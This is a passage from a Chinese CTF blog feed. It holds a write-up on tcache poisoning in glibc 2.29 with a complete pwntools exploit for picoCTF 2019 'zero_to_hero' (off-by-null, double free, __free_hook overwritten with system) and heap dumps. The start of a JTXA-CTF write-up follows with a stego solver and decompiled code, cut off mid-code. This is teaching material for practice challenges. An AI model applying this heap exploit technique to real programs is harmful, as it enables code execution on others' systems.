free，这里也是入手点。绕过思路有以下两个：</p><ol><li>如果有UAF漏洞或堆溢出，可以修改<code>e-&gt;key</code>为空，或者其他非<code>tcache_perthread_struct</code>的地址。这样可以直接绕过<code>_int_free</code>里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</li><li>利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到<code>_int_free</code>里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。</li></ol><h2 id="picoctf2019-zero-to-hero"><a href="#picoctf2019-zero-to-hero" class="headerlink" title="picoctf2019 zero_to_hero"></a>picoctf2019 zero_to_hero</h2><p>由于渗透环境的题目，官方暂时不允许公开wp，我这里找到了picoctf2019一题pwn进行演示攻击流程。首先看一下题目的保护情况:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/ctf/work/zero_to_hero&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  &apos;./&apos;</span><br></pre></td></tr></table></figure><p>题目提供了ld-2.29.so和libc.so.6(版本为2.29)，如果使用Ubuntu19.10以下版本进行调试，需要用patchelf进行patch。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  char buf[24]; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  puts(&quot;From Zero to Hero&quot;);</span><br><span class="line">  puts(&quot;So, you want to be a hero?&quot;);</span><br><span class="line">  buf[read(0, buf, 0x14uLL)] = 0;</span><br><span class="line">  if ( buf[0] != &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No? Then why are you even here?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Really? Being a hero is hard.&quot;);</span><br><span class="line">  puts(&quot;Fine. I see I can&apos;t convince you otherwise.&quot;);</span><br><span class="line">  printf(&quot;It&apos;s dangerous to go alone. Take this: %p\n&quot;, &amp;system);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      printf(&quot;&gt; &quot;);</span><br><span class="line">      v3 = 0;</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v3);</span><br><span class="line">      getchar();</span><br><span class="line">      if ( v3 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 == 3 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v3 != 1 )</span><br><span class="line">      goto LABEL_11;</span><br><span class="line">    add(&quot;%d&quot;, &amp;v3);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Giving up?&quot;);</span><br><span class="line">LABEL_11:</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目逻辑很简单，只有add和delete两个功能，同时程序直接给出了system的运行地址，不需要进行libc地址泄露，难度大大降低。</p><p>漏洞一：free之后没有情况指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400BB3()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  v1 = 0;</span><br><span class="line">  puts(&quot;Which power would you like to remove?&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%u&quot;, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v1 &gt; 6 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  free(qword_602060[v1]);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞二：写入description时，如果字符串长度等于输入的size，<code>str[size]</code>会写\x00，存在off by null。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; // rbx</span><br><span class="line">  size_t size; // [rsp+0h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  LODWORD(size) = 0;</span><br><span class="line">  HIDWORD(size) = sub_4009C2();</span><br><span class="line">  if ( (size &amp; 0x8000000000000000LL) != 0LL )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You have too many powers!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Describe your new power.&quot;);</span><br><span class="line">  puts(&quot;What is the length of your description?&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;, size);</span><br><span class="line">  __isoc99_scanf(&quot;%u&quot;, &amp;size);</span><br><span class="line">  getchar();</span><br><span class="line">  if ( (unsigned int)size &gt; 0x408 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Power too strong!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  qword_602060[SHIDWORD(size)] = malloc((unsigned int)size);</span><br><span class="line">  puts(&quot;Enter your description: &quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;, &amp;size, size);</span><br><span class="line">  v0 = qword_602060[SHIDWORD(size)];</span><br><span class="line">  v0[read(0, qword_602060[SHIDWORD(size)], (unsigned int)size)] = 0; // off by null</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目还有一点限制，申请内存最大不超过0x408，也就是不超过tcache在64位的大小，并且最多只能创建7个chunk，因此只够刚好填满tcache，没办法利用到fastbins。</p><p>攻击流程思考：首先，这个程序没有UAF，因此上面提到的第一个绕过思路在这里行不通。题目存在off by null，刚好满足思路2的最低要求，而且free后没清空指针，可以直接触发double free。那么思路很明确了，通过off by null对下一个chunk的size复写最低位，修改chunk的大小，从而绕过libc-2.29的double free检测，由于题目开了<code>Full RELRO</code>，可以通过修改<code>__free_hook</code>为one_gadget或system进行getshell。下面开始构造exp。</p><ul><li>程序开头会询问<code>you want to be a hero?</code>，直接回复y就好了，然后非常友好地提供了system的运行地址，提取后计算出libc基址即可。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'hero?'</span>,<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">system = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">libc.address = system - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">"libc.addres : &#123;:#x&#125;"</span>.format(libc.address))</span><br></pre></td></tr></table></figure><ul><li>然后创建两个大小不同的chunk，分别为0x58和0x100。前面一个chunk需要申请<code>0x10*n+8</code>的大小，要让这个chunk最后8字节跟下一个chunk的size连接上。而下一个chunk的大小要大于0x100且大小不为0x100整数倍，因为我们只有off by null，要确保最低位写0后，size不为0且大小改变。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>, <span class="string">'0000'</span>) <span class="comment"># Chunk 0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'1111'</span>) <span class="comment"># Chunk 1</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0xe28000            0x0                 0x250                Used                None              None</span><br><span class="line">0xe28250            0x0                 0x60                 Used                None              None</span><br><span class="line">0xe282b0            0x0                 0x110                Used                None              None</span><br></pre></td></tr></table></figure><ul><li>依次free掉这两个chunk，其中1号chunk进入了0x110大小的tcache。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># 0x60 tcache</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0x110 tcache</span></span><br></pre></td></tr></table></figure><p>可以看到两个chunk的bk，均写入了tcache_perthread_struct的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x60 [  1]: 0xe28260 ◂— 0x0</span><br><span class="line">0x110 [  1]: 0xe282c0 ◂— 0x0</span><br><span class="line">pwndbg&gt; x/50gx 0xe28260-0x10</span><br><span class="line">0xe28250:       0x0000000000000000      0x0000000000000061</span><br><span class="line">0xe28260:       0x0000000000000000      0x0000000000e28010</span><br><span class="line">0xe28270:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xe28280:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xe28290:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xe282a0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xe282b0:       0x0000000000000000      0x0000000000000111</span><br><span class="line">0xe282c0:       0x0000000000000000      0x0000000000e28010</span><br><span class="line">0xe282d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xe282e0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p><ul><li>重新创建一个0x58大小的chunk，利用off by null，将下一个chunk的size由0x111改成0x100。这里还提前放好<code>/bin/sh\x00</code>，方便后面getshell。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## off by null</span></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">'/bin/sh\x00'</span> + <span class="string">'0'</span>*<span class="number">0x50</span>) <span class="comment"># Chunk 0</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0xe28260-0x10</span><br><span class="line">0xe28250:       0x0000000000000000      0x0000000000000061</span><br><span class="line">0xe28260:       0x0068732f6e69622f      0x3030303030303030</span><br><span class="line">0xe28270:       0x3030303030303030      0x3030303030303030</span><br><span class="line">0xe28280:       0x3030303030303030      0x3030303030303030</span><br><span class="line">0xe28290:       0x3030303030303030      0x3030303030303030</span><br><span class="line">0xe282a0:       0x3030303030303030      0x3030303030303030</span><br><span class="line">0xe282b0:       0x3030303030303030      0x0000000000000100</span><br><span class="line">0xe282c0:       0x0000000000000000      0x0000000000e28010</span><br><span class="line">0xe282d0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><ul><li>现在，chunk 1的size已经变成0x100，由于0x100大小的tcache并无chunk，再次free此chunk并不会产生报错。因为指针没清空，我们直接再次删除chunk 1即可。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## double free</span></span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>此时chunk 1分别进入了0x100和0x110大小的tcache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x100 [  1]: 0xe282c0 ◂— 0x0</span><br><span class="line">0x110 [  1]: 0xe282c0 ◂— 0x0</span><br></pre></td></tr></table></figure></p><ul><li>然后就是正常的tcache poisoning流程，首先申请一个0x110大小的chunk，然后写入<code>__free_hook</code>的地址，相当于修改了0x100大小的chunk的fd。申请两次0x100大小的chunk就可以修改<code>__free_hook</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## tcache poisoning</span></span><br><span class="line">add(<span class="number">0x100</span>, p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'1234'</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x100 [  1]: 0xe282c0 —▸ 0x7f3758dc28c8 (__free_hook) ◂— ...</span><br></pre></td></tr></table></figure><ul><li>最后，free掉之前预备的chunk 0，里面为<code>/bin/sh\x00</code>，即可getshell。</li></ul><p>完整EXP：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">target = <span class="string">'zero_to_hero'</span>  </span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">context.binary = <span class="string">'./'</span>+target</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./'</span>+target)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">'&gt; '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>, str(idx))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'hero?'</span>,<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## leak address</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">system = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">libc.address = system - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">"libc.addres : &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">'0000'</span>) <span class="comment"># Chunk 0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'1111'</span>) <span class="comment"># Chunk 1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">## off by null</span></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">'/bin/sh\x00'</span> + <span class="string">'0'</span>*<span class="number">0x50</span>) <span class="comment"># Chunk 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## double free</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## tcache poisoning</span></span><br><span class="line">add(<span class="number">0x100</span>, p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'1234'</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">## getshell</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></p><p><a href="http://ftp.gnu.org/gnu/glibc/glibc-2.29.tar.gz" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/glibc-2.29.tar.gz</a></p><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_entry" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_entry</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;tcache-poisoning在glibc2-29中的利用小结&quot;&gt;&lt;a href=&quot;#tcache-poisoning在glibc2-29中的利用小结&quot; class=&quot;headerlink&quot; title=&quot;tcache poisoning在glibc2.29中的
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>JTXA-CTF</title>
    <link href="https://4f-kira.github.io/2019/11/04/JTXA-CTF/"/>
    <id>https://4f-kira.github.io/2019/11/04/JTXA-CTF/</id>
    <published>2019-11-04T07:59:13.000Z</published>
    <updated>2019-11-04T08:11:50.061Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JTXA-CTF-非官方writeup"><a href="#JTXA-CTF-非官方writeup" class="headerlink" title="JTXA-CTF 非官方writeup"></a>JTXA-CTF 非官方writeup</h1><p>官方版还没发布，吃瓜群众版writeup先行发布，超详细的。</p><h2 id="0x1-好像没有什么思路"><a href="#0x1-好像没有什么思路" class="headerlink" title="0x1 好像没有什么思路"></a>0x1 好像没有什么思路</h2><p>略</p><h2 id="0x2-好像没有什么思路2"><a href="#0x2-好像没有什么思路2" class="headerlink" title="0x2 好像没有什么思路2"></a>0x2 好像没有什么思路2</h2><p>也略</p><h2 id="0x3-Caesar"><a href="#0x3-Caesar" class="headerlink" title="0x3 Caesar"></a>0x3 Caesar</h2><p>继续略</p><h2 id="0x4-babyRSA"><a href="#0x4-babyRSA" class="headerlink" title="0x4 babyRSA"></a>0x4 babyRSA</h2><p>这题还是略</p><h2 id="0x5-SSTI"><a href="#0x5-SSTI" class="headerlink" title="0x5 SSTI"></a>0x5 SSTI</h2><p>没环境，略</p><h2 id="0x6-这是什么"><a href="#0x6-这是什么" class="headerlink" title="0x6 这是什么"></a>0x6 这是什么</h2><p>提取zip包，我直接WinRAR打开都没提示加密，解压后是Base64隐写，直接脚本跑就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">  base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">  res = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">    <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">      <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">'./Wh4t_1s_th1s.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_lines = f.readlines()</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">      steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">      norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">      diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">      pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">      <span class="keyword">if</span> diff:</span><br><span class="line">        bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">      res_str = <span class="string">''</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">print</span> res_str</span><br><span class="line"></span><br><span class="line">solve_stego()</span><br></pre></td></tr></table></figure><h2 id="0x7-ok"><a href="#0x7-ok" class="headerlink" title="0x7 ok"></a>0x7 ok</h2><p>brainfuck，略</p><h2 id="0x8-reverse-me"><a href="#0x8-reverse-me" class="headerlink" title="0x8 reverse me!"></a>0x8 reverse me!</h2><p>程序要求输入账号和密码，要root密码正确才能进行加密功能，以下是加密函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">sub_400DCA</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+3Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = '_emolceW';</span><br><span class="line">  v4 = 'rever_ot';</span><br><span class="line">  v5 = 'llahc_es';</span><br><span class="line">  v6 = 'egne';</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0L</span>L;</span><br><span class="line">  v9 = <span class="number">0L</span>L;</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    s1[i] = *((_BYTE *)&amp;v3 + i) ^ a1[i];</span><br><span class="line">  <span class="keyword">return</span> <span 